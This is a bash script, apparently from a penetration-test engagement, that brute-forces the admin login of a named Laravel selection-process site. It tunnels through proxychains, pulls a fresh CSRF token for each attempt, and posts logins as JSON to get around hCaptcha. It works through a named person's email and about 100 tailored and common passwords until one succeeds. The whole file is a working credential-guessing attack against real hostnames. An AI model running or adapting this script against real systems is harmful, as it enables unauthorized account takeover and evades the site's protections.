#!/bin/bash
# F-103 Brute Force Admin - ProSeleta (Laravel)
# Uso: proxychains4 bash F-103_bruteforce_admin.sh 2>&1 | tee -a F-103_bruteforce_admin.log

OUTPUT="/home/ubuntu/engagement/cotec-fadenor.selecao.net.br/evidence/F-103_bruteforce_admin.txt"
BASE="https://ifes25-semproxy.selecao.net.br"

# Users to test (will be converted to email format if needed)
USERS=(
    "gustavo@impactaweb.com.br"
    "admin"
    "administrador"
    "suporte"
    "root"
    "adm"
    "selecao"
    "cotec"
    "fadenor"
    "proseleta"
    "impacta"
    "ifes"
    "instituto"
    "gestao"
    "painel"
    "coordenador"
    "secretaria"
    "superadmin"
    "master"
    "rh"
)

# Passwords
PASSWORDS=(
    "admin" "123456" "admin123" "selecao" "cotec2023"
    "fadenor2023" "impacta2023" "ProSeleta" "proseleta"
    "@dmin2023" "password" "12345678" "qwerty" "letmein"
    "welcome" "monkey" "dragon" "master" "1234" "12345"
    "senha" "senha123" "ifes2023" "ifes2024" "cotec2024"
    "proseleta2024" "impactaweb" "gustavo" "teste" "teste123"
    "admin2024" "Admin123" "Admin@123" "administrador"
    "gestao" "painel" "suporte" "abc123" "654321" "102030"
    "020202" "123456789" "1234567890" "000000" "111111"
    "222222" "333333" "444444" "555555" "666666" "777777"
    "888888" "999999" "Impacta2023" "Proseleta@2023"
    "Cotec2023!" "Fadenor@2024" "selecao.net.br" "adminifes"
    "selecao2024" "processoseletivo" "Cotec2024!" "cotec@2023"
    "fadenor@2023" "proseleta@2023" "impacta@2023" "senh@123"
    "adm2023" "adm2024" "COTEC" "FADENOR" "PROSELETA"
    "admin@123" "Admin@1234" "P@ssw0rd" "p@ssw0rd"
    "cotec2025" "fadenor2025" "Cotec@2023" "Fadenor@2023"
    "impacta2024" "impacta@2024" "Proseleta2023" "proseleta2023"
    "COTEC2023" "FADENOR2023" "PROSELETA2023" "impactaweb@2023"
    "gustavo@2023" "gustavo123" "impacta@123" "cotec@123"
    "fadenor@123" "ProSeleta2023" "ProSeleta2024" "C0t3c2023"
    "F4d3n0r2023" "1mpacta2023"
)

DOMAIN="selecao.net.br"
ATTEMPT=0
FOUND=0

# Build user list with emails
EMAIL_USERS=()
for u in "${USERS[@]}"; do
    if [[ "$u" == *@* ]]; then
        EMAIL_USERS+=("$u")
    else
        EMAIL_USERS+=("$u@$DOMAIN")
    fi
done

# Add some common email patterns
EMAIL_USERS+=("admin@cotec.com.br" "admin@ifes.edu.br" "admin@proseleta.com.br")
EMAIL_USERS+=("suporte@selecao.net.br" "contato@selecao.net.br")

echo "=== F-103 Brute Force Admin ==="
echo "Target: $BASE/admin/login/"
echo "Users: ${#EMAIL_USERS[@]}"
echo "Passwords: ${#PASSWORDS[@]}"
echo "Total attempts: $(( ${#EMAIL_USERS[@]} * ${#PASSWORDS[@]} ))"
echo "Start: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""

# Write output header
echo "# F-103 Brute Force Admin" > "$OUTPUT"
echo "Alvo: $BASE/admin/login/" >> "$OUTPUT"
echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$OUTPUT"
echo "Severidade: Crítica" >> "$OUTPUT"
echo "" >> "$OUTPUT"
echo "## Resultados" >> "$OUTPUT"
echo "" >> "$OUTPUT"

for user in "${EMAIL_USERS[@]}"; do
    if [ $FOUND -eq 1 ]; then
        echo ">>> BREAK - credencial encontrada"
        break
    fi
    
    for pass in "${PASSWORDS[@]}"; do
        ATTEMPT=$((ATTEMPT + 1))
        
        # Get fresh CSRF token
        page=$(proxychains4 curl -sk -c /tmp/bftoken.txt \
            "https://ifes25-semproxy.selecao.net.br/admin/login/" 2>/dev/null)
        token=$(echo "$page" | grep -oP 'name="_token" value="\K[a-zA-Z0-9_-]+')
        
        if [ -z "$token" ]; then
            echo "[$ATTEMPT] WARN: No CSRF token, retrying..."
            sleep 0.5
            continue
        fi
        
        # Try login as JSON (bypass hCaptcha)
        resp=$(proxychains4 curl -sk -b /tmp/bftoken.txt \
            -H "Content-Type: application/json" \
            -H "Accept: application/json" \
            -H "X-CSRF-TOKEN: $token" \
            -d "{\"email\":\"$user\",\"password\":\"$pass\"}" \
            -w "%{http_code}" \
            -o /tmp/bfresp.txt \
            "https://ifes25-semproxy.selecao.net.br/admin/login/" 2>/dev/null)
        
        http_code="$resp"
        
        # Read response body
        body=$(cat /tmp/bfresp.txt)
        
        # Detect success
        if [ "$http_code" = "302" ]; then
            echo "[$ATTEMPT] ✅ SUCESSO (302): $user : $pass"
            echo "✅ SUCESSO (302): $user : $pass" >> "$OUTPUT"
            FOUND=1
            break 2
        elif [ "$http_code" = "200" ] && [[ "$body" != *"invalid"* ]] && [[ "$body" != *"erro"* ]] && [[ "$body" != *"Usuário"* ]]; then
            echo "[$ATTEMPT] ✅ Possível SUCESSO (200): $user : $pass"
            echo "Body: $body"
            echo "✅ SUCESSO (200): $user : $pass" >> "$OUTPUT"
            echo "Body: $body" >> "$OUTPUT"
            FOUND=1
            break 2
        elif [ "$http_code" = "422" ]; then
            # Normal invalid credentials
            if [[ "$body" == *"email"* ]]; then
                echo "[$ATTEMPT] ✗ $user : $pass -> HTTP 422 (email inválido)"
            else
                echo "[$ATTEMPT] ✗ $user : $pass -> HTTP 422 (senha inválida)"
            fi
        else
            echo "[$ATTEMPT] ? $user : $pass -> HTTP $http_code"
        fi
        
        sleep 0.2
    done
done

echo ""
echo "=== SUMMARY ==="
if [ $FOUND -eq 1 ]; then
    echo "✅ Credencial(s) encontrada(s)! Ver $OUTPUT"
else
    echo "❌ Nenhuma credencial encontrada."
fi
echo "Total attempts: $ATTEMPT"
echo "End: $(date -u +%Y-%m-%dT%H:%M:%SZ)"

echo "" >> "$OUTPUT"
echo "Total de tentativas: $ATTEMPT" >> "$OUTPUT"
echo "Fim: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$OUTPUT"